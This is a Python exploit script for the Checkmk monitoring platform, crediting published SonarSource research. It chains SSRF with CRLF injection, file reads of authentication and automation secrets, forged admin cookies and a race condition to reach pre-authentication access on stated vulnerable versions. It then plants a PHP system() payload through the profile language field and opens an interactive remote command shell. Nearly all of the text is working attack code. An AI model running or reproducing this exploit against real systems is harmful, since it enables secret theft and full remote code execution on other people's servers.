
# This exploit uses a chain of vulnerabilities to achieve remote code execution 
# Read more details from the brilliant research by: Stefan Schiller (SonarSource)  
# https://www.sonarsource.com/blog/checkmk-rce-chain-1/
#
# Versions from 2.1.0 to <2.1.0p12 are vulnerable to pre-auth rce.
# Run the exploit with an url and optionally -s to start a pre-auth attack. 
# Serial gets incremented every time a user's password is changed.
# 
# Authenticated rce is also possible for older versions (tested on 2.0.0p18)
# Run the exploit with -u and -p for an authenticated attack.
#
#
#                                                   exploit by gbrsh@secragon.com
#

import re
import sys
import json 
import time
import urllib3
import argparse
import requests
from hashlib import sha256
from threading import Thread
from bs4 import BeautifulSoup
from colorama import Fore, Style
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

raceable = False
site = ""
version = ""
username="automation"
password=""


def get_site_name(target):

  global site 
  global version
  global raceable
  try:
    r = requests.get(f"{target}", verify=False)
    site = re.search(r"Checkmk Local site (.*)</title>", r.text).groups()[0]
    version = re.search(r"Version: (.*) -", r.text).groups()[0]

  except:
    print(Fore.RED + f'error...')
    exit()

  print(Fore.GREEN + f'{site}')
  print(Style.RESET_ALL + "Site version: ", end=' ')
  print(Fore.GREEN + f'{version}', end=' ')

  m,n = version.split('p')

  if m == "2.1.0" and int(n) < 12:
    raceable = True
    print("- pre-auth vulnerable!")
  else:
    print()




def do_ssrf(target, auto = False):

  username = "gbrsh@secragon.com"
  password = "2023"
  jdata = {}
  if auto == False:
    jdata = {
      "uuid":"fd31b6b5-325d-4b65-b496-d7e4d16c8a93", 
      "host_name":f"../../../../ajax_graph_images.py?host=%0a&force_authuser=foo%0aKeepAlive:+on%0a%0aCOMMAND+[1337001337]+PROCESS_FILE%3b%2fopt%2fomd%2fsites%2f{site}%2fetc%2fauth.secret%3b1%0a%0aGET+nada%0a"
    }
  else:
    jdata = {
      "uuid":"fd31b6b5-325d-4b65-b496-d7e4d16c8a93", 
      "host_name":f"../../../../ajax_graph_images.py?host=%0a&force_authuser=foo%0aKeepAlive:+on%0a%0aCOMMAND+[1337001337]+PROCESS_FILE%3b%2fopt%2fomd%2fsites%2f{site}%2fvar%2fcheck_mk%2fweb%2fautomation%2fautomation.secret%3b1%0a%0aGET+nada%0a"
    }

  r = requests.post(f'https://{target}:8000/{site}/agent-receiver/register_with_hostname', auth=(username, password), json=jdata, verify=False)


def generate_cookie(serial):
  value = "cmkadminfd31b6b5-325d-4b65-b496-d7e4d16c8a93"
  secret = ""

  return "cmkadmin:" + value[8:] + ":" + sha256((value + str(serial) + secret).encode()).hexdigest()


def leak_automation_secret(target, cookie):

  r = requests.post(f'http://{target}/{site}/nagvis/server/core/ajax_handler.php?mod=General&act=getHoverUrl&url[]=file:///opt/omd/sites/vuln/var/check_mk/web/automation/automation.secret', cookies=cookie, verify=False)
  try:
    j = json.loads(r.text[1:-1])
    global hit
    global password
    password = j["code"]
    hit = True
  except: 
    pass 


def recreate_auth_secret(target, cookie):

  r = requests.post(f'http://{target}/{site}/check_mk/index.py', cookies=cookie, verify=False)


def get_shell(target):

  data = f'filled_in=login&_login=1&_origtarget=index.py&_username={username}&_password={password}&_login=Login'
  form_header = { "Content-Type" : "application/x-www-form-urlencoded" }

  s = requests.Session()
  s.post(f'http://{target}/{site}/check_mk/login.py', data=data, headers=form_header, verify=False)

  r = s.get(f'http://{target}/{site}/check_mk/user_profile.py', verify=False)
  soup = BeautifulSoup(r.text, "html.parser")

  oldver = False
  try:
    csrf_token = re.search(r'var global_csrf_token = "(.*)"', r.text).groups()[0]
  except:
    # Older versions does not have csrf (tested on 2.0.0p18) :)
    oldver = True
    pass
  transid = soup.find('input', {'name': '_transid'}).get('value')

  if oldver == True:
    payload = f"""filled_in=profile&_transid={transid}&language=pwn\\'));%0asystem($_GET["cmd"]);%0a?>&ua_disable_notifications_p_timerange_0_year=2023&ua_disable_notifications_p_timerange_0_month=1&ua_disable_notifications_p_timerange_0_day=24&ua_disable_notifications_p_timerange_0_hour=21&ua_disable_notifications_p_timerange_0_min=0&ua_disable_notifications_p_timerange_0_sec=43&ua_disable_notifications_p_timerange_1_year=2023&ua_disable_notifications_p_timerange_1_month=1&ua_disable_notifications_p_timerange_1_day=24&ua_disable_notifications_p_timerange_1_hour=21&ua_disable_notifications_p_timerange_1_min=0&ua_disable_notifications_p_timerange_1_sec=43&ua_start_url_use=0&ua_start_url_1=dashboard.py&ua_ui_theme_use=0&ua_ui_theme_1=087a83c5ab8d7dd7c80e8c32473ee48b2102a1d055b5dbd02cdd216b15109d2b&ua_ui_sidebar_position=dc937b59892604f5a86ac96936cd7ff09e25f18ae6b758e8014a24c7fa039e91&ua_nav_hide_icons_title=dc937b59892604f5a86ac96936cd7ff09e25f18ae6b758e8014a24c7fa039e91&ua_icons_per_item=dc937b59892604f5a86ac96936cd7ff09e25f18ae6b758e8014a24c7fa039e91&ua_show_mode_use=0&ua_show_mode_1=31e3f7a7a194b443c16d007491d4e65e5fd0bcf329f357abde852bf9ad170f8d&_save=SET"""
  else:
    payload = f"""csrf_token={csrf_token}&filled_in=profile&_transid={transid}&language=pwn\\'));%0asystem($_GET["cmd"]);%0a?>&ua_disable_notifications_p_timerange_0_year=2023&ua_disable_notifications_p_timerange_0_month=1&ua_disable_notifications_p_timerange_0_day=24&ua_disable_notifications_p_timerange_0_hour=21&ua_disable_notifications_p_timerange_0_min=0&ua_disable_notifications_p_timerange_0_sec=43&ua_disable_notifications_p_timerange_1_year=2023&ua_disable_notifications_p_timerange_1_month=1&ua_disable_notifications_p_timerange_1_day=24&ua_disable_notifications_p_timerange_1_hour=21&ua_disable_notifications_p_timerange_1_min=0&ua_disable_notifications_p_timerange_1_sec=43&ua_start_url_use=0&ua_start_url_1=dashboard.py&ua_ui_theme_use=0&ua_ui_theme_1=087a83c5ab8d7dd7c80e8c32473ee48b2102a1d055b5dbd02cdd216b15109d2b&ua_ui_sidebar_position=dc937b59892604f5a86ac96936cd7ff09e25f18ae6b758e8014a24c7fa039e91&ua_nav_hide_icons_title=dc937b59892604f5a86ac96936cd7ff09e25f18ae6b758e8014a24c7fa039e91&ua_icons_per_item=dc937b59892604f5a86ac96936cd7ff09e25f18ae6b758e8014a24c7fa039e91&ua_show_mode_use=0&ua_show_mode_1=31e3f7a7a194b443c16d007491d4e65e5fd0bcf329f357abde852bf9ad170f8d&_save=SET"""

  s.post(f'http://{target}/{site}/check_mk/user_profile.py', data=payload, headers=form_header, verify=False)

  while 1:
    cmd = input(">> ")
    if cmd == "exit":
      print(" [info] Exiting... restoring system to defaults first...")
      r = s.get(f'http://{target}/{site}/check_mk/user_profile.py', verify=False)
      soup = BeautifulSoup(r.text, "html.parser")
      # csrf_token = re.search(r'var global_csrf_token = "(.*)"', r.text).groups()[0]
      transid = soup.find('input', {'name': '_transid'}).get('value')
      if oldver == True:
        payload = f"""filled_in=profile&_transid={transid}&language=&ua_disable_notifications_p_timerange_0_year=2023&ua_disable_notifications_p_timerange_0_month=1&ua_disable_notifications_p_timerange_0_day=24&ua_disable_notifications_p_timerange_0_hour=21&ua_disable_notifications_p_timerange_0_min=0&ua_disable_notifications_p_timerange_0_sec=43&ua_disable_notifications_p_timerange_1_year=2023&ua_disable_notifications_p_timerange_1_month=1&ua_disable_notifications_p_timerange_1_day=24&ua_disable_notifications_p_timerange_1_hour=21&ua_disable_notifications_p_timerange_1_min=0&ua_disable_notifications_p_timerange_1_sec=43&ua_start_url_use=0&ua_start_url_1=dashboard.py&ua_ui_theme_use=0&ua_ui_theme_1=087a83c5ab8d7dd7c80e8c32473ee48b2102a1d055b5dbd02cdd216b15109d2b&ua_ui_sidebar_position=dc937b59892604f5a86ac96936cd7ff09e25f18ae6b758e8014a24c7fa039e91&ua_nav_hide_icons_title=dc937b59892604f5a86ac96936cd7ff09e25f18ae6b758e8014a24c7fa039e91&ua_icons_per_item=dc937b59892604f5a86ac96936cd7ff09e25f18ae6b758e8014a24c7fa039e91&ua_show_mode_use=0&ua_show_mode_1=31e3f7a7a194b443c16d007491d4e65e5fd0bcf329f357abde852bf9ad170f8d&_save=SET"""
      else: 
        payload = f"""csrf_token={csrf_token}&filled_in=profile&_transid={transid}&language=&ua_disable_notifications_p_timerange_0_year=2023&ua_disable_notifications_p_timerange_0_month=1&ua_disable_notifications_p_timerange_0_day=24&ua_disable_notifications_p_timerange_0_hour=21&ua_disable_notifications_p_timerange_0_min=0&ua_disable_notifications_p_timerange_0_sec=43&ua_disable_notifications_p_timerange_1_year=2023&ua_disable_notifications_p_timerange_1_month=1&ua_disable_notifications_p_timerange_1_day=24&ua_disable_notifications_p_timerange_1_hour=21&ua_disable_notifications_p_timerange_1_min=0&ua_disable_notifications_p_timerange_1_sec=43&ua_start_url_use=0&ua_start_url_1=dashboard.py&ua_ui_theme_use=0&ua_ui_theme_1=087a83c5ab8d7dd7c80e8c32473ee48b2102a1d055b5dbd02cdd216b15109d2b&ua_ui_sidebar_position=dc937b59892604f5a86ac96936cd7ff09e25f18ae6b758e8014a24c7fa039e91&ua_nav_hide_icons_title=dc937b59892604f5a86ac96936cd7ff09e25f18ae6b758e8014a24c7fa039e91&ua_icons_per_item=dc937b59892604f5a86ac96936cd7ff09e25f18ae6b758e8014a24c7fa039e91&ua_show_mode_use=0&ua_show_mode_1=31e3f7a7a194b443c16d007491d4e65e5fd0bcf329f357abde852bf9ad170f8d&_save=SET"""
      s.post(f'http://{target}/{site}/check_mk/user_profile.py', data=payload, headers=form_header, verify=False)
      print("\t\t\tBye Bye!\n")
      exit()

    r = s.get(f'http://{target}/{site}/nagvis/server/core/ajax_handler.php?mod=Multisite&act=getMaps&cmd={cmd}', verify=False)
    if(r.status_code == 200):
      print(r.text[:r.text.find("',\n")])
    else:
      print("exploit failed?!")


print()
print(Fore.BLUE + "\t\t --- Checkmk chain exploit ---")
print("\t\t    (remote code execution)")
print(Fore.RED + "\t\t\t\tby gbrsh@secragon")
print(Style.RESET_ALL)


parser = argparse.ArgumentParser()

parser.add_argument('url', help='http://host/site')
parser.add_argument('-u', '--username', required=False, help="username")
parser.add_argument('-p', '--password', required=False, help="password")
parser.add_argument('-s', '--serial', required=False, default=0, help="serial [default: 0]")


if len(sys.argv) == 1:
    parser.print_help()
    print()
    exit()

args = parser.parse_args()

target = args.url

print()
print("Getting site name", end=' ')
get_site_name(target)

host = urlparse(target).hostname

counter=1
hit=False
if args.username is None and args.password is None:
  if raceable == False:
    print(Style.RESET_ALL + "This version of Checkmk is not vulnerable to a pre-auth attack!", end=' ')
    print(Fore.RED + "Exiting...")
    exit()

  
  print(Style.RESET_ALL + "Starting the race... go get yourself a coffee...")
  time.sleep(1)

  threads = []

  # Serial changes +1 everytime the user's passowrd is changed... (keep it in mind :) )
  ser=args.serial
  cookie = { "auth_vuln" : generate_cookie(ser) }
  while True:

    do_ssrf(host)

    recr = Thread(target=recreate_auth_secret,args=(host, cookie))

    for i in range(10):
      threads.append(Thread(target=leak_automation_secret,args=(host, cookie)))

    recr.start()
    time.sleep(0.01)

    for i in range(10):
      threads[i].start()

    # for i in range(10):
    #   threads[i].join()

    threads.clear()

    counter += 1
    if counter%1000 == 0:
      print("...still trying... ")
    if hit == True or counter == 10000: 
      break

if counter == 10000:
  print(Style.RESET_ALL + "Exhausted... maybe try another serial?!", end= ' ')
  print(Fore.RED + "Exiting...")
  exit()

if args.username is not None and args.password is not None:
  username = args.username
  password = args.password

print(Style.RESET_ALL + "Shhhh!!! I have a secret: ", end=' ')
print(Fore.GREEN + f"{password}")
print(Style.RESET_ALL + "Final touches...")
if hit == True:
  do_ssrf(host, True)
print(Fore.GREEN + "Now patience pays off!") 
print(Style.RESET_ALL)
time.sleep(3)
get_shell(host)

